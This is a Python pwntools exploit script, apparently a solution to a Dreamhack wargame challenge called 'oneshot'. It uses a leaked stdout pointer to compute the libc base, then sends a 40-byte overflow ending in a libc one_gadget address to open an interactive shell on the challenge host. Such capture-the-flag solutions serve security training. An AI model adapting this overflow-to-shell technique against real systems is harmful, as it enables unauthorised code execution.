#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 20049)

    return r


def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    stdout = int(r.recvuntil(b"\n", drop=True), 16)

    libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
    
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    payload = b"\x00" * 40 + p64(libc_base + one_gadgets[0])
    r.sendafter(b"MSG: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
